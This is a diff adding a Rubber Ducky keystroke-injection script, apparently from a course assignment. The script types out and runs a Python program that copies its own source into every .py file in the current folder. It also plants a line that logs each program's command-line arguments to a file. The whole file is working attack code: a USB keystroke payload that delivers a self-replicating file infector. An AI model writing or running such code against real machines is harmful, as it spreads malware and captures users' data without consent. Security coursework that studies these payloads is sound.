@@ -1,0 +1,48 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING notepad
+ENTER
+DELAY 1000
+STRING D='Q1C.out'
+ENTER
+STRING A='utf-8'
+ENTER
+STRING from pathlib import Path
+ENTER
+STRING import sys
+ENTER
+STRING I=D
+ENTER
+STRING with open(__file__,'r',encoding=A)as E:F=E.read()
+ENTER
+STRING for B in Path.cwd().glob('*.py'):
+ENTER
+STRING     C=B.read_text(encoding=A)
+ENTER
+STRING     if D in C:continue
+ENTER
+STRING     G='\nwith open("Q1C.out","a") as f:\n    f.write(" ".join(__import__("sys").argv) + "\\n")\n'
+ENTER
+STRING     H=G+'\n'+F+'\n'+C
+ENTER
+STRING     B.write_text(H,encoding=A)
+ENTER
+CTRL s
+DELAY 500
+STRING Q1C.py
+ENTER
+DELAY 500
+CTRL w
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd OneDrive\Desktop\3140\rubber ducky\src
+ENTER
+DELAY 500
+STRING python3 Q1C.py
+ENTER
+
